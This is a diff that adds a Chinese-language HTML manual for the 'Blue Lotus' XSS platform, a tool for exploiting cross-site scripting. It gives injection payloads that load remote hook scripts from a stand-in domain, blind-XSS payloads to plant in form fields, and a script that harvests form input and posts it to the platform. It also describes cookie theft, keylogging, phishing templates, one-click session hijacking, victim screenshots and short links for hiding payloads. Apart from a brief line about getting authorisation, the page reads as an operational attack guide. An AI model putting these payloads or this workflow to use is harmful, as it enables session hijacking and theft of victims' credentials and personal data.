@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="shortcut icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="apple-touch-icon" href="../tu/xssicon.png">
+    
+<meta name="description" content="蓝莲花XSS测试平台完整使用教程，包括项目管理、Payload生成、数据收集、盲XSS监控等全部功能详解。">
+<meta name="keywords" content="XSS平台,XSS测试,蓝莲花,Payload管理,Cookie收集,盲XSS,Web安全测试">
+<title>XSS测试平台使用完全手册 - 蓝莲花XSS平台</title>
+<link href="../static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet"><link href="../static/libs/fontawesome/css/all.min.css" rel="stylesheet"><link href="../static/css/style.css" rel="stylesheet"><link href="../static/libs/prism/css/prism-tomorrow.min.css" rel="stylesheet">
+<style>.header{background:linear-gradient(135deg,#1a1a2e,#16213e);padding:3rem 0;border-bottom:2px solid #00ff41}.content{max-width:900px;margin:2rem auto;padding:2rem;background:rgba(0,0,0,0.3);border-radius:8px}h2{color:#00ff41;margin-top:2.5rem;padding-bottom:0.5rem;border-bottom:2px solid rgba(0,255,65,0.3)}pre{background:rgba(0,0,0,0.5);padding:1.5rem;border-radius:8px;border-left:3px solid #00ff41}.tip{background:rgba(40,167,69,0.1);border-left:4px solid #28a745;padding:1rem;margin:1.5rem 0}        
+        /* 鍥炲埌椤堕儴鎸夐挳 */
+        .back-to-top {
+            position: fixed;
+            bottom: 40px;
+            right: 40px;
+            width: 50px;
+            height: 50px;
+            background: var(--neon-green);
+            color: #000;
+            border: none;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            cursor: pointer;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0, 255, 65, 0.3);
+        }
+        
+        .back-to-top:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.5);
+        }
+        
+        .back-to-top.show {
+            opacity: 1;
+            visibility: visible;
+        }
+    </style>
+</head>
+<body>
+<div class="container"><nav aria-label="breadcrumb"><ol class="breadcrumb" style="background:transparent;padding:1rem 0"><li class="breadcrumb-item"><a href="../index.html" style="color:#00ff41">首页</a></li><li class="breadcrumb-item"><a href="../wiki.html" style="color:#00ff41">知识库</a></li><li class="breadcrumb-item active">平台使用手册</li></ol></nav></div>
+<div class="header"><div class="container text-center"><h1 style="font-size:2.5rem;color:#fff"><i class="fas fa-server"></i> XSS测试平台使用完全手册</h1><div style="color:#999">16分钟阅读 | 工具使用</div></div></div>
+<div class="container"><div class="content" style="color:#ccc;line-height:1.8">
+<h2><i class="fas fa-rocket"></i> 一、快速开始</h2>
+<h3>1.1 注册与登录</h3>
+<p>访问平台首页，点击"注册"按钮创建账户。登录后进入控制面板。</p>
+
+<h3>1.2 创建第一个项目</h3>
+<pre><code class="language-javascript">// 步骤：
+1. 点击"新建项目"
+2. 填写项目名称（如：测试站点A）
+3. 选择项目类型（Web应用/移动应用/API）
+4. 配置通知方式（邮件/Telegram/Webhook）
+5. 点击"创建"</code></pre>
+
+<h2><i class="fas fa-code"></i> 二、Payload管理</h2>
+<h3>2.1 生成Payload</h3>
+<pre><code class="language-markup">&lt;!-- 基础Payload --&gt;
+&lt;script src="https://your-domain.com/xss/project-id/hook.js"&gt;&lt;/script&gt;
+
+&lt;!-- 图片标签Payload --&gt;
+&lt;img src=x onerror="var s=document.createElement('script');s.src='https://your-domain.com/xss/project-id/hook.js';document.body.appendChild(s)"&gt;
+
+&lt;!-- 盲XSS Payload --&gt;
+&lt;script src="https://your-domain.com/xss/project-id/blind.js"&gt;&lt;/script&gt;</code></pre>
+
+<h3>2.2 Payload模板</h3>
+<p>平台提供多种预设模板：</p>
+<ul><li>Cookie窃取模板</li><li>键盘记录模板</li><li>钓鱼页面模板</li><li>端口扫描模板</li><li>自定义JavaScript模板</li></ul>
+
+<h2><i class="fas fa-database"></i> 三、数据收集</h2>
+<h3>3.1 查看收集的数据</h3>
+<p>在项目面板中查看触发记录，包括：</p>
+<ul><li>触发时间</li><li>受害者IP和地理位置</li><li>浏览器信息</li><li>Cookie数据</li><li>页面URL</li><li>Referer信息</li><li>屏幕截图（如果启用）</li></ul>
+
+<h3>3.2 数据导出</h3>
+<pre><code class="language-javascript">// 支持格式
+- JSON格式导出
+- CSV表格导出
+- 生成安全报告PDF</code></pre>
+
+<h2><i class="fas fa-eye-slash"></i> 四、盲XSS监控</h2>
+<h3>4.1 配置盲XSS</h3>
+<pre><code class="language-javascript">// 在项目设置中启用盲XSS监控
+1. 启用邮件通知
+2. 设置Telegram Bot Token
+3. 配置Webhook URL
+4. 设置触发延迟提醒</code></pre>
+
+<h3>4.2 盲XSS Payload部署</h3>
+<pre><code class="language-markup">&lt;!-- 在所有可疑输入点使用 --&gt;
+表单字段、备注框、用户名、邮箱等：
+&lt;script src="//your-domain.com/xss/blind/unique-id.js"&gt;&lt;/script&gt;</code></pre>
+
+<div class="tip"><h4><i class="fas fa-lightbulb"></i> 使用技巧</h4>
+<p>1. 为每个测试点使用唯一ID<br>
+2. 定期检查盲XSS触发记录<br>
+3. 配置多种通知方式避免遗漏<br>
+4. 使用短链接隐藏Payload</p></div>
+
+<h2><i class="fas fa-chart-line"></i> 五、高级功能</h2>
+<h3>5.1 自定义JavaScript</h3>
+<pre><code class="language-javascript">// 在平台编辑器中编写自定义代码
+// 示例：获取表单数据
+(function(){
+  var forms = document.querySelectorAll('form');
+  var data = [];
+  forms.forEach(form => {
+    var fields = {};
+    form.querySelectorAll('input').forEach(input => {
+      fields[input.name] = input.value;
+    });
+    data.push(fields);
+  });
+  
+  // 发送到平台
+  fetch('/api/collect', {
+    method: 'POST',
+    body: JSON.stringify(data)
+  });
+})();</code></pre>
+
+<h3>5.2 会话劫持</h3>
+<p>平台提供一键会话劫持功能：</p>
+<ul><li>自动导入Cookie</li><li>浏览器指纹模拟</li><li>自动跳转到目标页面</li></ul>
+
+<h3>5.3 实时截图</h3>
+<p>启用html2canvas库自动截取受害者屏幕。</p>
+
+<h2><i class="fas fa-shield-alt"></i> 六、安全与隐私</h2>
+<h3>6.1 项目隔离</h3>
+<p>每个项目拥有独立的数据库和访问权限。</p>
+
+<h3>6.2 数据加密</h3>
+<p>所有收集的敏感数据均使用AES-256加密存储。</p>
+
+<h3>6.3 访问日志</h3>
+<p>平台记录所有操作日志，支持审计。</p>
+
+<h2><i class="fas fa-book"></i> 七、最佳实践</h2>
+<ol><li>始终获得授权后再进行测试</li><li>不要在生产环境中使用破坏性Payload</li><li>定期备份重要数据</li><li>遵守负责任披露原则</li><li>及时删除过期项目数据</li></ol>
+
+<h2><i class="fas fa-question-circle"></i> 八、常见问题</h2>
+<h3>Q: Payload没有触发？</h3>
+<p>A: 检查CSP策略、浏览器控制台错误、网络连接</p>
+
+<h3>Q: 如何隐藏Payload URL？</h3>
+<p>A: 使用平台内置的短链接生成功能</p>
+
+<h3>Q: 支持哪些浏览器？</h3>
+<p>A: Chrome、Firefox、Safari、Edge等现代浏览器</p>
+
+<div style="display:flex;justify-content:space-between;margin-top:3rem;padding-top:2rem;border-top:1px solid #333">
+<a href="mutation-xss.html" style="color:#00ff41;text-decoration:none"><i class="fas fa-arrow-left"></i> 上一篇</a>
+<a href="../wiki.html" style="color:#00ff41;text-decoration:none">返回知识库</a>
+<a href="burpsuite-xss.html" style="color:#00ff41;text-decoration:none">下一篇 <i class="fas fa-arrow-right"></i></a>
+</div>
+</div></div>
+<footer class="footer"><div class="container-fluid"><div style="text-align:center;color:#999">© 2025 蓝莲花XSS平台</div></div></footer>    
+    <!-- 鍥炲埌椤堕儴鎸夐挳 -->
+    <button class="back-to-top" id="backToTop">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+    
+<script src="../static/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
+<script src="../static/libs/prism/js/prism.min.js"></script>    <script>
+        // 鍥炲埌椤堕儴鍔熻兘
+        const backToTopBtn = document.getElementById('backToTop');
+        window.addEventListener('scroll', function() {
+            if (window.pageYOffset > 300) {
+                backToTopBtn.classList.add('show');
+            } else {
+                backToTopBtn.classList.remove('show');
+            }
+        });
+        backToTopBtn.addEventListener('click', function() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+    </script>
+</body></html>
